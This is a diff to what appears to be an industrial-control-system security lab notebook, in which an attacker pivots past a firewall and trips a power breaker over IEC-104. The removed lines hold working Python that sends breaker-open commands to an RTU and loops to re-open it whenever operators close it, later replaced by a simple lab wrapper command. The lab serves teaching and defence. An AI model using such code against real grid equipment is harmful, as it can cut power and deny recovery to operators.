@@ -295,13 +295,13 @@
           {
             "id": "edu-normal",
             "kind": "markdown",
-            "source": "## 2 \u00b7 Normal operations\n\nThe breaker is controlled over **IEC-104**, a standard power-grid protocol (TCP port **2404**). The device that physically opens/closes it is the **RTU** (remote terminal unit) at `10.0.3.50`.\n\nAn authorized engineer, from **`eng-ws`**, sends control commands **through the firewall** to the RTU. Run the step and **watch the HMI**: the breaker opens, then closes again \u2014 ordinary, authorized control."
+            "source": "## 2 \u00b7 Normal operations\n\nThe breaker is controlled over **IEC-104**, a standard power-grid protocol (TCP port **2404**). The device that physically opens/closes it is the **RTU** (remote terminal unit) at `10.0.3.50`.\n\nTo keep things readable, this lab wraps that protocol in one command \u2014 **`breaker status | open | close`**. An authorized engineer, from **`eng-ws`**, runs it **through the firewall**. Check the state, then open and close it \u2014 **watch the HMI** toggle. Ordinary, authorized control."
           },
           {
             "id": "edu-engws-toggle",
             "kind": "command",
             "containerId": "engws",
-            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nbreaker = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\nbreaker.value = False; breaker.transmit(cause=c104.Cot.ACTIVATION); print(\"maintenance: breaker OPEN\"); time.sleep(3)\nbreaker.value = True;  breaker.transmit(cause=c104.Cot.ACTIVATION); print(\"maintenance done: breaker CLOSED\")\nPY"
+            "command": "breaker status\nbreaker open\nsleep 3\nbreaker close"
           },
           {
             "id": "edu-recon",
@@ -323,7 +323,7 @@
           {
             "id": "edu-blocked",
             "kind": "markdown",
-            "source": "## 4 \u00b7 Blocked at the firewall\n\nThe attacker tries to reach the RTU's control port directly. The firewall **drops it** \u2014 this office box isn't the permitted `eng-ws`. So the attacker looks for a machine that sits in **both** networks."
+            "source": "## 4 \u00b7 Blocked at the firewall\n\nThe eng-ws just drove the breaker through the firewall. The **attacker's** office box can't: it tries to reach the RTU's control port directly and the firewall **drops it** \u2014 only the authorized `eng-ws` is allowed through. So the attacker looks for a machine that sits in **both** networks."
           },
           {
             "id": "edu-direct",
@@ -362,13 +362,13 @@
           {
             "id": "edu-trip",
             "kind": "markdown",
-            "source": "## 7 \u00b7 Trip the breaker\n\nOne IEC-104 command opens the breaker (station **CA 47**, command point **12**; `False` = OPEN) \u2014 the *same kind* of command the operator sends, so nothing looks wrong on the wire.\n\n**Watch the HMI flip to OPEN \u00b7 red**, and `process-sim` (:8000) go dark. No operator did this."
+            "source": "## 7 \u00b7 Trip the breaker\n\nThe attacker runs the **same `breaker open`** an engineer would \u2014 but from inside the plant, against the live breaker. One command, and on the wire it looks exactly like authorized control.\n\n**Watch the HMI flip to OPEN \u00b7 red**, and `process-sim` (:8000) go dark. No operator did this."
           },
           {
             "id": "edu-open",
             "kind": "command",
             "containerId": "attacker",
-            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nbreaker = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\nbreaker.value = False; print(\"attacker OPEN ->\", breaker.transmit(cause=c104.Cot.ACTIVATION))\nPY"
+            "command": "breaker open"
           },
           {
             "id": "edu-recover",
@@ -379,18 +379,18 @@
             "id": "edu-engws-close",
             "kind": "command",
             "containerId": "engws",
-            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nbreaker = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\nbreaker.value = True; print(\"operator CLOSE ->\", breaker.transmit(cause=c104.Cot.ACTIVATION))\nPY"
+            "command": "breaker close"
           },
           {
             "id": "edu-deny",
             "kind": "markdown",
-            "source": "Now the attacker **denies recovery**: a short loop that re-opens the breaker the instant it closes. **This step keeps running until you press `Ctrl-C` in its terminal.**"
+            "source": "Now the attacker **denies recovery** with an injected loop that calls `breaker open` over and over \u2014 the instant the operator closes it, it re-opens. **This step keeps running until you press `Ctrl-C` in its terminal.**"
           },
           {
             "id": "edu-retrip",
             "kind": "command",
             "containerId": "attacker",
-            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nst = conn.add_station(common_address=47)\nstate = st.add_point(io_address=11, type=c104.Type.M_SP_NA_1)\ncmd   = st.add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\ncmd.value = False; cmd.transmit(cause=c104.Cot.ACTIVATION)\nprint(\"denying recovery - press Ctrl-C to stop\")\nwhile True:\n    conn.interrogation(common_address=47); time.sleep(0.5)\n    if state.value is True:\n        cmd.value = False; cmd.transmit(cause=c104.Cot.ACTIVATION)\n        print(\"operator closed -> re-OPENED\")\nPY"
+            "command": "while sleep 1; do breaker open >/dev/null 2>&1; done"
           },
           {
             "id": "edu-lost",
